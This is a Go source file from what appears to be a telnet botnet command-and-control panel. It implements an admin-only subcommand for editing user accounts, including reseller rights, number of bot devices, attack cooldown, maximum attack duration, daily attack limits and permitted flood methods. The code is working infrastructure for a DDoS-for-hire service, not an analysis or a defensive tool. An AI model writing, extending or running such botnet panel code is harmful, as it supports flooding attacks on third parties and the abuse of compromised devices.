package subcommands

import (
	"advanced-telnet-cnc/packages/pflag"
	"advanced-telnet-cnc/source/config"
	"advanced-telnet-cnc/source/database"
	"advanced-telnet-cnc/source/master/command"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/termfx"
	"strconv"
)

func init() {
	command.Subcommand("users", &command.SubCommand{
		Aliases:   []string{"update", "edit", "change"},
		Admin:     true,
		Arguments: []command.Argument{{"username", false}, {"options", true}},
		Executor: func(args []string, fx *termfx.TermFX, session *sessions.Session, parent *command.Command) error {
			user, err := database.UserFromName(args[0])
			if err != nil {
				return session.CmdError(err)
			}

			flagSet := pflag.NewFlagSet("users edit", pflag.ContinueOnError)
			flagSet.SetOutput(session.Conn)

			flagSet.StringVarP(&user.Name, "name", "n", user.Name, "Username from the user")
			flagSet.StringVarP(&user.Password, "password", "p", user.Password, "Password from the user")
			flagSet.BoolVarP(&user.Admin, "admin", "a", user.Admin, "Allows the user to execute administrative commands")
			flagSet.BoolVarP(&user.Reseller, "reseller", "r", user.Reseller, "Allows the user to execute commands like 'users add'")
			flagSet.IntVarP(&user.Devices, "devices", "d", user.Devices, "The devices the user has access to")
			flagSet.IntVarP(&user.Cooldown, "cooldown", "c", user.Cooldown, "The cooldown the user has after an attack")
			flagSet.IntVarP(&user.MaxTime, "time", "t", user.MaxTime, "The maximum attack duration the user has")
			flagSet.IntVarP(&user.MaxAttacks, "attacks", "f", user.MaxAttacks, "The maximum attacks the user has per day")
			flagSet.IntSliceVarP(&user.Methods, "methods", "m", user.Methods, "Floods the user has access to")

			err = flagSet.Parse(args[1:])
			if err != nil {
				if err == pflag.ErrHelp {
					return nil
				}

				return session.CmdError(err)
			}

			err = database.SetUser(user)
			if err != nil {
				return session.CmdError(err)
			}

			return session.Printf("%sSuccessfully updated %s in the database.\r\n", config.Green, strconv.Quote(user.Name))
		},
	})
}
